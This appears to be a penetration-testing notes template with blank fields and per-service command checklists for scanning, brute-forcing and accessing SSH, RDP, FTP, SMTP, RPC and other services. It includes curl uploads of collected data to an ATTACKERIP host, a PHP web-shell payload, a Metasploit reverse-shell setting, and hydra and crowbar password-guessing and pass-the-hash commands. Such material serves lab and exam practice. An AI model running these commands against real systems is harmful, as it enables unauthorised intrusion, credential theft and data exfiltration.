
### Abstract


#### Information about Target

| Type              | Comment                  |
| ----------------- | ------------------------ |
| Attacker IP, Host | ATTACKERIP, `Kali Linux` |
| IP                | TARGETIP                 |
| IPv6              |                          |
| Secondary IP      |                          |
| Hostname          |                          |
| OS                |                          |
| ARCH              |                          |
| System SID        |                          |
| Virtual Machine   |                          |
| Is Cloned         |                          |
| Container/Cloud   |                          |
| Domain            |                          |
| UAC               |                          |
| AV                |                          |
| Firewall          |                          |
| Selinux/Apparmor  |                          |
| Ping              |                          |
| TCP               |                          |
| UDP               |                          |
| Internal Ports    |                          |
: Information about `host`

https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers

| Name | Ports | Description | Comment |
| ---- | ----- | ----------- | ------- |
|      |       |             |         |
: Information about `services`

| User | Password | Comment |
| ---- | -------- | ------- |
|      |          |         |
: Information about `credentials`

| EDB-ID | Link | Comment |
| ------ | ---- | ------- |
|        |      |         |
: Information about `exploits`

| Flag               | Value |
| ------------------ | ----- |
| local.txt          |       |
| user.txt           |       |
| proof.txt          |       |
| root.txt           |       |
| network-secret.txt |       |
: Information about `flags`


#### Initial Exploitation

- 


#### Privilege Escalation

- 


### Initial Setup


Set variables required for various activities.

```bash
IP="TARGETIP" CATEGORY="" NAME="" ROUTER="" NETWORK="" NS="" WORKING_DIR="" TOOLS_DIR=""
```


Create required directories.

```bash
mkdir -p ${WORKING_DIR}/{logs,recon,files} ; mkdir -p ${TOOLS_DIR}/{general,recon,windows,linux,web,tftp,smb}
```


Navigate to working directory in all working prompts for this target.

```bash
cd ${WORKING_DIR}
```


Setup command prompt logging.

```bash
script -aqf --log-out ${WORKING_DIR}/logs/${IP}-$(date "+%d%b%Y-%H%M").log --log-timing ${WORKING_DIR}/logs/${IP}-$(date "+%d%b%Y-%H%M").tm
```


Host a `web server` using `apache` or `wwwtree` for transferring tools and logs. Download `wwwtree` wordlists from https://github.com/t3l3machus/wwwtree and modify the path, if not available already.

```bash
python3 ${TOOLS_DIR}/general/wwwtree/wwwtree.py -r /var/www/html -i tun0
```


If tools/payloads are hosted via `apache2`, create an `upload.php` page in webroot to receive files, if not available already.

```php
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

```bash
sudo `mkdir /var/www/uploads ; chown -R www-data:www-data /var/www`
```


Download `fuzzdb` wordlists from https://github.com/fuzzdb-project/fuzzdb to the location `/usr/share/wordlists`, if not already present.


### Port Forwarding


Establish a `ssh dynamic port forwarding` to ``, which routes to `` - ``.

```bash
sudo sshpass -p "" ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "ConnectTimeout=10" -N -D 127.0.0.1:9050 @${ROUTER}
```


To establish a multi-hop `ssh dynamic port forwarding`,

```bash
IP1="" IP2="" USER1="" USER2="" ; ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "ConnectTimeout=10" -J ${USER1}@${IP1} -o "kexAlgorithms=+diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=+ssh-dss" -N -D 127.0.0.1:9050 ${USER2}@${IP2}
```


Establish a `netsh` port forwarding to ``, which routes to `` - ``.

```cmd
netsh interface portproxy add v4tov4 listenport= listenaddress= connectport= connectaddress=
netsh advfirewall firewall add rule name="Forward_port_rule" protocol=TCP dir=in localip= localport= action=allow
```


Modify `proxychains` to allow port forwarding via `9050` port.

```bash
echo 'socks4  127.0.0.1  9050' | sudo tee -a /etc/proxychains4.conf
```


Check the connectivity in remote server.

```text

```


### Enumeration


#### Network

**General Methodology**
> Find hostname of target.
> Check if target responds to `ICMP`. Target OS can be detected using TTL value.
> Perform `masscan` to quickly find open ports. Check if any `UDP` ports are open.
> Perform `nmap` scan to find OS, service and other basic enumeration on `TCP` ports.
> If any `UDP` ports are opened, perform enumeration using `nmap` and `udp-proto-scanner`.
> Perform `nmap - vuln` scan if required.
> Run `autorecon` script in the background, if required.
> Add an entry to `/etc/hosts` for web enumeration.


**Enumeration**

Find the hostname of target.

```bash
host ${IP} ${NS}
```

```text

```


Check if `icmp` is allowed.

```bash
ping -c4 ${IP}
```

```text

```

| TTL | OS                              |
| --- | ------------------------------- |
| 32  | Windows 98                      |
| 64  | Linux/Unix/MacOS/NetworkDevices |
| 128 | Windows                         |
| 127 | Windows                         |
| 254 | Solaris/Cisco                   | 
| 255 | BSD/Solaris/Linux(2.2.14/2.4)   |
: Identifying OS based on ICMP TTL


Use `masscan` to enumerate open ports and check if any `UDP` ports are available.

```bash
sudo masscan --ports T:1-65535,U:1-65535 --rate=1000 --wait 3 --banners -e tun0 ${IP} | tee -a recon/ports
```

```text

```


```bash
tcp_ports=$(grep Discovered recon/ports | grep tcp | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
udp_ports=$(grep Discovered recon/ports | grep udp | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')
echo -e "TCP Ports - ${tcp_ports}\nUDP Ports - ${udp_ports}"
```

```text

```


Use `nmap` for detailed enumeration.

```bash
sudo nmap -n -Pn -T4 -sS -p T:- -A --version-all --osscan-guess --min-parallelism 100 --min-rate 1000 --max-scan-delay 100ms --dns-servers ${NS} --source-port 53 --reason -oA recon/nmap-${IP}-tcp-initial ${IP} 2>/dev/null
```

```bash
sudo proxychains -q nmap -n -Pn -T4 -sT --top-ports 1000 -A --reason -oA recon/nmap-${IP}-tcp-initial ${IP} 2>/dev/null
```

```text

```


```bash
sudo nmap -n -Pn -T4 -sU -p ${udp_ports} --dns-servers ${NS} --source-port 53 -A --reason -oA recon/nmap-${IP}-udp-initial ${IP} 2>/dev/null
```

```text

```


**Vuln Scan**

Use `nmap nse` - `vuln` scans.

```bash
sudo nmap -n -Pn -T4 -sS -sU -p T:${tcp_ports},U:${udp_ports} --dns-servers ${NS} --source-port 53 --script vuln -A --reason -oA recon/nmap-${IP}-vulns-initial ${IP} 2>/dev/null
```

```text

```


**Proxy**

If connected via proxy, run `nmap` enumeration scans from jump server. Download `static-toolbox` binaries from https://github.com/ernw/static-toolbox/releases and place in webroot, if not available already.

```bash
wget http://ATTACKERIP/tools/static-toolbox/nmap-7.91SVN-x86_64-portable.tar.gz
mkdir -p nmap/recon ; mv nmap-7.91SVN-x86_64-portable.tar.gz nmap ; cd nmap ; tar -zxf nmap-7.91SVN-x86_64-portable.tar.gz

wget http://ATTACKERIP/tools/static-toolbox/nmap-7.91SVN-x86-portable.tar.gz
mkdir -p nmap/recon ; mv nmap-7.91SVN-x86-portable.tar.gz nmap ; cd nmap ; tar -zxf nmap-7.91SVN-x86-portable.tar.gz
```


```bash
IP="" ; ./run-nmap.sh -n -Pn -sS -T4 -p T:- -A --version-all --osscan-guess --min-parallelism 100 --min-rate 1000 --max-scan-delay 100ms --reason -oA recon/nmap-${IP}-tcp-initial ${IP}
```

```text

```


```bash
IP="" ; sudo ./run-nmap.sh -n -Pn -sU -T4 -p U:1-500 --min-parallelism 100 --min-rate 1000 --max-scan-delay 100ms --reason -oA recon/nmap-${IP}-udp-initial ${IP}
```

```text

```


```bash
zip -r recon.zip recon
tar -czf recon.tgz recon

curl -F "file=@recon.zip" http://ATTACKERIP/upload.php
curl -F "file=@recon.tgz" http://ATTACKERIP/upload.php
```


```bash
IP="" ; for i in {1..65535} ; do (echo < /dev/tcp/${IP}/${i}) &>/dev/null && printf "[+] Open Port at : %d\n" "${i}" ; done
```

```text

```

```bash
IP="" ; nc -vz -u -w 1 ${IP} 20-500
```

```text

```


**UDP Scaner**

Use `udp-proto-scanner` for accurate udp scan. Download `udp-proto-scanner` from https://github.com/CiscoCXSecurity/udp-proto-scanner and modify the path, if not available already.

```bash
sudo ${TOOLS_DIR}/recon/udp-proto-scanner/udp-proto-scanner.pl ${IP} | tee -a recon/udp-proto-scanner.txt
```

```text

```


**Auto-Recon**

Use `autorecon` for detailed enumeration. Download `autorecon` from https://github.com/Tib3rius/AutoRecon and modify the path, if not available already.

```bash
AUTORECON_OUTPUT_PATH="${WORKING_DIR}/../../AutoRecon/${CATEGORY}/${NAME}" ; sudo mkdir -p ${AUTORECON_OUTPUT_PATH} ; sudo python3 ${TOOLS_DIR}/recon/AutoRecon/autorecon.py --output ${AUTORECON_OUTPUT_PATH} ${IP}
```


**Addional NMAP Scripts**

Find `nse` scripts relevant to port. Common vulnerabilities for the ports also will be listed.

```bash
SEARCH='22|ssh' ; for i in $( grep -w portrule /usr/share/nmap/scripts/* | grep -iwE ${SEARCH} | awk -F':' '{print $1}' | sort | uniq ) ; do printf -- '=%.0s' {1..${#i}} ; echo ; echo ${i} ; printf -- '-%.0s' {1..${#i}} ; echo ; awk '/description = \[\[/{flag=1; next} /\]\]/{flag=0} flag' ${i} ; printf -- '=%.0s' {1..${#i}} ; echo ; done
```


#### Squid

**General Methodology**
> Run `spose` to gather service specific information.
> Run `nmap` to gather service specific information and vulnerability information.


**Enumeration**

Use `spose` to gather information about target. Download `spose` from https://github.com/aancw/spose and modify the path, if not available already.

```bash
python ${TOOLS_DIR}/recon/spose/spose.py --proxy http://${IP}:3128 --target ${IP} | tee -a recon/ports-spose
```

```text

```


```bash
spose_ports=$(grep OPEN recon/ports-spose | awk -F " " '{print $2}' | sort -n | tr '\n' ',' | sed 's/,$//')
echo -e "Ports - ${spose_ports}"
```

```text

```


Enumerate with `nmap nse` to find additional information.

> Remove old proxy entries or change to `dynamic_chain`.

```bash
echo "http ${IP} 3128" | sudo tee -a /etc/proxychains4.conf
```


If there is no response, change `${IP}` to `127.0.0.1`.

```bash
sudo proxychains -q nmap -n -Pn -T4 -sT -p- -oA recon/nmap-${IP}-tcp-squid-ports ${IP} 2>/dev/null
```

```text

```


```bash
sudo proxychains -q nmap -n -Pn -T4 -sT T:${spose_ports} -A --reason -oA recon/nmap-${IP}-tcp-squid ${IP} 2>/dev/null
```

```text

```


#### SSH

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Gather OS information from the obtained service information.
> Check possibilities for generating custom wordlist for brute-forcing.
> If any valid creds are found previously, check if they can be reused.
> Check if `shellshock` exploit is applicable https://github.com/mubix/shellshocker-pocs.
> Check if predictable keys are available https://github.com/g0tmi1k/debian-ssh.
> If `openssl` version is found and vulnerable, check exploit POC https://www.exploit-db.com/exploits/5720.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:22 --script "ssh-auth-methods,ssh-hostkey,sshv1" -sV -oA recon/nmap-${IP}-tcp-ssh ${IP}
```

```text

```


```bash
crackmapexec ssh ${IP}
```

```text

```


**OS Guess**

Validate `ssh` version in [rapid7/recog](https://github.com/rapid7/recog/blob/main/xml/ssh_banners.xml) to guess the OS version.

```xml

```


**Protocol Audit**

```bash
ssh-audit -2 -4 ${IP}
```

```text

```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Crackmapexec`
- `Hydra`
- `Patator`
- `Crowbar`


```bash
USER="" ; hydra -I -l ${USER} -P /usr/share/wordlists/rockyou.txt ${IP} -t 4 ssh
hydra -I -L users.txt -P /usr/share/wordlists/rockyou.txt ${IP} -t 4 ssh
```

```text

```


**SSH Command**

```bash
echo 'PubkeyAcceptedKeyTypes +ssh-dss' >> ~/.ssh/config
```

```bash
USER="" PASS="" PORT="" ; sshpass -p ${PASS} ssh -q -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -o "ConnectTimeout=10" -o "kexAlgorithms=+diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=+ssh-dss" ${USER}@${IP} -p ${PORT}
```


#### RDP

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:3389 --script "rdp-ntlm-info,rdp-enum-encryption" -sV -oA recon/nmap-${IP}-tcp-rdp ${IP}
```

```text

```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Crackmapexec`
- `Hydra`
- `Crowbar`


```bash
USER="" ; crowbar -b rdp -s ${IP} -u ${USER} -C /usr/share/wordlists/rockyou.txt -n 16
crowbar -b rdp -s ${IP} -U users.txt -C /usr/share/wordlists/rockyou.txt -n 16
```

```text

```


```bash
USER="" ; hydra -I -l ${USER} -P /usr/share/wordlists/rockyou.txt ${IP} -t 4 rdp
hydra -I -L users.txt -P /usr/share/wordlists/rockyou.txt ${IP} -t 4 rdp
```

```text

```


If `domain`, `user`, `password` or `hash` information are available for guessing,

```bash
DOMAIN="" USER="" PASS="" ; impacket-rdp_check ${DOMAIN}/${USER}:${PASS}@${IP}
```

```bash
DOMAIN="" USER="" HASH="" ; impacket-rdp_check -hashes ${HASH} ${DOMAIN}/${USER}@${IP}
```

```text

```


**RDP Connectiion**

```bash
DOMAIN="" USER="" PASS='' DISPLAY=:10.0 ; rdesktop -d ${DOMAIN} -u ${USER} -p ${PASS} -r clipboard:CLIPBOARD,disk:kali=/home/kali/oscp -g 90% ${IP}
```


Use `WLOG_LEVEL=DEBUG` or `/log-level:debug` for debug log in `xfreerdp`. Add `/proxy:socks5://127.0.0.1:9050` to connect via proxy.

```bash
DOMAIN="" USER="" HASH="" DISPLAY=:10.0 ; xfreerdp /d:${DOMAIN} /u:${USER} /pth:${HASH} /v:${IP} /cert:ignore /smart-sizing:1400x1080 /size:1400x1080
DOMAIN="" USER="" HASH="" DISPLAY=:10.0 ; xfreerdp /d:${DOMAIN} /u:${USER} /pth:${HASH} /v:${IP} /dynamic-resolution +clipboard /cert:ignore /drive:/home/kali/oscp,kali
```


If `RDP` file is found,

```bash
remmina -c file.rdp
```


#### FTP

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if `anonymous` login is allowed.
> If `anonymous` login is allowed, download all files and analyze locally for any interesting information.
> If `anonymous` login is allowed, check if files can be uploaded.
> Check for well-known exploit POCs.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**Tips**
> Turn on `binary` and passive (`quote PASV` or `quote EPSV`) modes in `FTP` session.
> If the target uses `ProFTPd`, files can be directly copied from/to target without downloading, using `mod_copy` module.


**Config Files**

Upload paths.
- `/var/ftp`

Config files.
- `/etc/vsftpd.conf`
- `/usr/local/etc/proftpd.conf`


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:21 --script "ftp-anon,ftp-syst" -sV -oA recon/nmap-${IP}-ftp ${IP}
```

```text

```


**Access**

Check if anonymous login is allowed and is having write access.

```bash
ftp ftp://anonymous:anonymous@${IP}
```

Commands to enumerate `FTP` server.

```text
quote PASV
quote EPSV

binary
ascii

ls -a
LIST -R

PORT 127,0,0,1,0,80
EPRT |2|127.0.0.1|80|
```

```text

```


Download all files.

```bash
wget -m ftp://anonymous:anonymous@${IP}
wget -m --no-passive ftp://anonymous:anonymous@${IP}
```

```text

```


If the target is `ProFTPd`, using `mod_copy`, files can be directly copied from/to server without downloading.

```text
site cpfr /tmp/payload.sh
site cpto /home/ftp/upload/payload.sh
```


**Exploits**

Check exploit POC.
`ProFTPd 1.3.5` - https://www.exploit-db.com/exploits/36742
`vsftpd 2.3.4` - https://gitlab.com/0xdf/ctfscripts/-/tree/master/vsftpd2.3.4-backdoor


*Metasploit*

```text
use exploit/unix/ftp/proftpd_modcopy_exec
set payload cmd/unix/reverse_python
set SITEPATH /var/www/html
```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Crackmapexec`
- `Hydra`


```bash
USER="" ; hydra -I -l ${USER} -P /usr/share/wordlists/rockyou.txt ${IP} -t 20 ftp
hydra -I -L users.txt -P /usr/share/wordlists/rockyou.txt ${IP} -t 20 ftp
```

```text

```


#### TFTP (UDP)

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if upload/download is allowed.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sU -T4 -p U:69 --script "tftp-enum" -sV -oA recon/nmap-${IP}-tftp ${IP}
```

```text

```


**Access**

```bash
tftp -i ${IP}
```

```bash
tftp -i ${IP} -m binary -c get '\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\DATA\master.mdf'
echo test > test.txt ; tftp -i ${IP} -c put test.txt
```

```text

```

Commands to enumerate `TFTP` server.

```text
get \windows\system32\license.rtf
```


Check if upload/download is allowed. Download `pyTFTP` from https://github.com/m4tx/pyTFTP and modify the path, if not available already.

```bash
sudo python3 ${TOOLS_DIR}/tftp/pyTFTP/client.py -g "\windows\system32\license.rtf" -t license.rtf ${IP}
```


```bash
touch something ; sudo python3 ${TOOLS_DIR}/tftp/pyTFTP/client.py -p something ${IP} ; rm -rf something
```

```text

```


#### Rsync

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if version or banner can be grabbed using `telnet` or `netcat`.
> Check if any share is accessible without authentication.


**References**
> https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync


**Config Files**
- `/etc/rsyncd.conf`
- `/etc/rsyncd.secrets`


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:873 --script "rsync-list-modules" -sV -oA recon/nmap-${IP}-tcp-rsync ${IP}
```

```text

```


**Access**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 873
```

```text

```

Commands to enumerate `Rsync` server.

```text
<banner>    #Send banner as input

#list

<share>
```


The shares can also be enumerated using `rsync` command.

```bash
rsync -av --list-only rsync://${IP}
```

```text

```


Copy files from share.

```bash
SHARE="" ; mkdir -p files/rsync/${SHARE} ; rsync -av rsync://${IP}/${SHARE} ./files/rsync/${SHARE}
```

```text

```


#### SMTP

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if version or banner can be grabbed using `telnet` or `netcat`.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.
> If the target is `Windows`, check possibility of gathering sensitive information from `NTLM` Auth (Information Disclosure).
> If the target uses `SSL`, gather information about the SSL/TLS.


**References**
> https://www.samlogic.net/articles/smtp-commands-reference.htm


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:25,465,587 --script "smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay" --script-args "smtp-enum-users.methods={EXPN,RCPT,VRFY}" -sV -oA recon/nmap-${IP}-tcp-smtp ${IP}
```

```text

```


**Access**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 25
```

```text

```

Commands to enumerate `SMTP` server.

```text
HELP

EHLO <name>

VRFY root
VRFY test

EXPN <recepient>
```

If target uses NTLM,

```text
AUTH NTLM

TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
```

Other `SMTP` commands.

```console
HELO <host>

MAIL FROM: <id>

RCPT TO: <id>

DATA
FROM: <id>
TO: <id>
Date: <date>
Subject: <subject>

<body>

QUIT
```


`PHP` payload can be specified in body.

```text
data
<?php system($_GET['cmd']); ?>
```


Generate date using the following command.

```bash
date '+%a, %d %b %Y %H:%M:%S %z'
```


**Brute-Force**

Enumerate users if not found from `nmap nse` script. Download `smtp-user-enum` binaries from https://pentestmonkey.net/tools/smtp-user-enum/smtp-user-enum-1.2.tar.gz and modify the path, if not available already.

```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t ${IP}
smtp-user-enum -M EXPN -U /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t ${IP}
smtp-user-enum -M RCPT -U /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t ${IP}

DOMAIN="" ; smtp-user-enum -D ${DOMAIN} -M RCPT -U /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t ${IP}
```

```text

```

Other wordlists which can be used.
- `/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt`
- `/usr/share/wordlists/SecLists/Usernames/Names/names.txt`
- `/usr/share/wordlists/metasploit/unix_users.txt`
- `/usr/share/wordlists/fastax.txt`


Find valid email accounts. Download `ismtp` binaries from https://github.com/altjx/ipwn/tree/master/iSMTP and modify the path, if not available already.

```bash
ismtp -h ${IP}:25 -e emails.txt
```

```text

```


**Send/Retrieve Mails**

The package `swaks` and `sendemail` will be installed by default. If missing, install manually.

```bash
USER="" DOMAIN="" ; swaks --to ${USER}@${DOMAIN} --from ${USER}@${DOMAIN} --header "Subject: test shell" --body 'sample test mail' --server ${IP}
```

```bash
USER="" DOMAIN="" ; sendEmail -t ${USER}@${DOMAIN} -f ${USER}@${DOMAIN} -s ${IP} -u "Important Upgrade Instructions" -m "Important Upgrade Instructions" -a /tmp/UpgradeInstructions.pdf
```

```text

```


```bash
for user in  ; do ( echo USER ${user} ; sleep 2s ; echo PASS  ; sleep 2s ; echo LIST ; sleep 2s ; echo QUIT ) | nc -nvC ${IP} 110 ; done
```

```bash
( echo USER  ; sleep 2s ; echo PASS  ; sleep 2s ; echo LIST ; sleep 2s ; echo RETR 1 ; sleep 2s ; echo RETR 2 ; sleep 2s ; echo QUIT ) | nc -nvC ${IP} 110
```

```text

```


**SSL Info**

```bash
DOMAIN="" ; openssl s_client -crlf -connect ${DOMAIN}:465
```

```text

```


```bash
DOMAIN="" ; openssl s_client -starttls smtp -crlf -connect ${DOMAIN}:587
```

```text

```


#### POP3

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if version or banner can be grabbed using `telnet` or `netcat`.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.
> Check if usernames are not validated by POP3 server.
> If the target uses `SSL`, gather information about the SSL/TLS.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:110,995 --script "pop3-capabilities,pop3-ntlm-info" -sV -oA recon/nmap-${IP}-tcp-pop3 ${IP}
```

```text

```


**Access**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 110
```

Commands to enumerate `POP3` server.

```text
HELP

USER <id>
PASS <pass>

STAT
LIST

RETR 1
RETR 2

NOOP

CAPA

QUIT
```

```text

```


**Brute-Force**

Check possibilities for generating custom wordlist using,
- `cewl`
- `wordhound`

Check for `brute-force` possibilities using,
- `Hydra`


```bash
USER="" PORT="" ; hydra -I -l ${USER} -P /usr/share/wordlists/rockyou.txt ${IP} -t 20 -s ${PORT} pop3
PORT="" ; hydra -I -L users.txt -P /usr/share/wordlists/rockyou.txt ${IP} -t 20 -s ${PORT} pop3

USER="" PORT="" ; hydra -I -l ${USER} -P /usr/share/wordlists/rockyou.txt ${IP} -t 20 -S -s ${PORT} pop3
PORT="" ; hydra -I -L users.txt -P /usr/share/wordlists/rockyou.txt ${IP} -t 20 -S -s ${PORT} pop3
```

```text

```

Other wordlists which can be used.
- `/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt`
- `/usr/share/wordlists/SecLists/Usernames/Names/names.txt`
- `/usr/share/wordlists/metasploit/unix_users.txt`
- `/usr/share/wordlists/fastax.txt`


**SSL Info**

```bash
openssl s_client -connect ${IP}:995 -crlf
```

```text

```


#### IMAP

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if version or banner can be grabbed using `telnet` or `netcat`.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.
> If the target uses `SSL`, gather information about the SSL/TLS.


**Tips**
> Use `evolution` mail client to setup mailbox and view mails.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:143,993 --script "imap-capabilities,imap-ntlm-info" -sV -oA recon/nmap-${IP}-tcp-imap ${IP}
```

```text

```


**Access**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 110
```

```text

```

Commands to enumerate `IMAP` server.

```text
LOGIN <user> <pass>

LIST "" "*"

EXAMINE "<inbox>"
SELECT "<inbox>"

FETCH <mail-number> BODY.PEEK[]
FETCH <mail-number> BODY[]
```

If target uses NTLM,

```text
a1 AUTHENTICATE NTLM

TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
```


**SSL Info**

```bash
openssl s_client -connect ${IP}:993 -crlf
```

```text

```


#### NNTP

**General Methodology**
> Check for package version in vendor website for clues about OS version.
> Check if version or banner can be grabbed using `telnet` or `netcat`.


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:119,433,563 --script "nntp-ntlm-info" -sV -oA recon/nmap-${IP}-tcp-nntp ${IP}
```

```text

```


**Access**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 119
```

```text

```

Commands to enumerate `NNTP` server.

```text
HELP

LIST

GROUP

ARTICLE

POST
From: <email>
Newsgroups: <name>
Subject: <subject>

<message text>

QUIT
```

`1 10 y` in `list` represents first and last article for the newsgroup.


#### RPC / MSRPC

**General Methodology**
> Run `nmap` to gather service specific information and vulnerability information.
> Check if version or banner can be grabbed using `telnet` or `netcat`.
> Enumerate for service information, null session and named pipes.
> Check if network information can be retrieved using `OXID` resolver.
> Check if target is vulnerable to `Print Nightmare`.
> If any valid creds are found previously, check if they can be reused.
> Check possibilities for generating custom wordlist for brute-forcing.


**References**
> https://0xffsec.com/handbook/services/msrpc/
> https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/
> https://medium.com/nets3c/remote-enumeration-of-network-interfaces-without-any-authentication-the-oxid-resolver-896cff530d37
> https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html
> https://kashz.gitbook.io/kashz-jewels/attacks/print-nightmare


**Enumeration**

Enumerate with `nmap nse` to find additional information.

```bash
sudo nmap -n -Pn -sT -T4 -p T:111,135,530,593,5722 --script "rpcinfo,rpc-grind,msrpc-enum,xmlrpc-methods,nfs-ls,nfs-statfs,nfs-showmount" -sV -oA recon/nmap-${IP}-tcp-rpc ${IP}
```

```text

```


**Access**

Use `netcat` or `telnet` to connect and test commands. By default, `netcat` uses `LF` as line feed. To use `CR+LF` as line feed, use `-C` option.

```bash
nc -nv ${IP} 111
```

```bash
nc -nv ${IP} 135
```

```text

```


Use `rpcinfo` to gather service information.

```bash
rpcinfo -s ${IP}
```

```text

```


```bash
rpcinfo -p ${IP}
```

```text

```


```bash
rpcbind -p ${IP}
```

```text

```


**Null Session Enumeration**

Test for null session.

```bash
rpcclient -c 'getusername' -U "" -N ${IP}
```

```text

```

Commands to enumerate `rpcclient` session.

```text
srvinfo : server information => os.version, samba-version.
netshareenum: enumerate shares

# basic info
querydominfo : domain info
enumdomusers : enum domain users
enumdomgroups : enum domain groups
enumprivs : enum user privileges
dsr_enumtrustdom : enumerate trusted domains

# query group info and membership
querygroup 0xGROUP
querygroupmem 0xGROUP

# query specific user by RID
queryuser USER : (sometimes has sensitive info in description)
lookupnames USER : (if user exists)

# password policy
querydompwinfo

enumdrivers
enumprinters
```


**Named Pipe Enumeration**

Test retrieving `rpc` command output using `named pipes`.

```bash
rpcclient ncacn_np:${IP} -c 'getusername' -U '' -N -d
```

```text

```


**RPC Endpoints dump**

Using `impacket` to dump information.

```bash
impacket-rpcdump ${IP}
```

Redacting endpoint information.

```text

```


```bash
impacket-samrdump ${IP}
```

```text

```


**OXID Resolver**

Use `OXID` resolver to find additional network interface address. Download `IOXIDResolver` from https://github.com/mubix/IOXIDResolver and modify the path, if not available already.

```bash
python3 ${TOOLS_DIR}/windows/IOXIDResolver/IOXIDResolver.py -t ${IP}
```

```text

```


**Vulnerability Check**

Check if target is vulnerable to `Print Nightmare`.

> https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html
> https://kashz.gitbook.io/kashz-jewels/attacks/print-nightmare

```bash
impacket-rpcdump ${IP} | egrep 'MS-RPRN|MS-PAR'
```

```text

```


**Brute-Force**

If `domain`, `user`, `password` or `hash` information are available for guessing,

```bash
DOMAIN="" USER="" PASS="" ; impacket-samrdump ${DOMAIN}/${USER}:${PASS}@${IP}
```

```bash
DOMAIN="" USER="" HASH="" ; impacket-samrdump -hashes ${HASH} ${DOMAIN}/${USER}@${IP}
```

```text

```


```bash
USER="" PASS="" ; impacket-lookupsid ${USER}:${PASS}@${IP}
```

```text

```


#### NetBIOS

**Protocol Information**

| Port | Protocol | Service                  |
| ---- | -------- | ------------------------ |
| 137  | TCP      | NetBIOS Name Service     | 
| 137  | UDP      | NetBIOS Name Service     |
| 138  | UDP      | NetBIOS Datagram Service |
| 139  | TCP      | NetBIOS Session Service  |
: Information about `NetBIOS` services


**General Methodology**
> Enumerate for service information.


**Enumeration**

Enumerate NetBIOS names.

```bash
nmblookup -A ${IP}
```

```text

```

- First field is the name
